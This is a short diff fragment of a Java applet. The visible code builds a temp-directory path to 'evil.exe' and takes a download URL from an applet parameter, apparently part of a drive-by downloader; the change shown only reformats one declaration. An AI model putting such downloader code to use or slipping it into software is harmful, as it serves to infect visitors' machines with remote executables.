@@ -20,8 +20,7 @@ public class Java extends Applet {
 	try {
 	String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
 	String expath = tmpdir + "evil.exe";
-	String
-	download = "";
+	String download = "";
 	download = getParameter("1");
 	if (download.length() > 0) {
 		// URL parameter
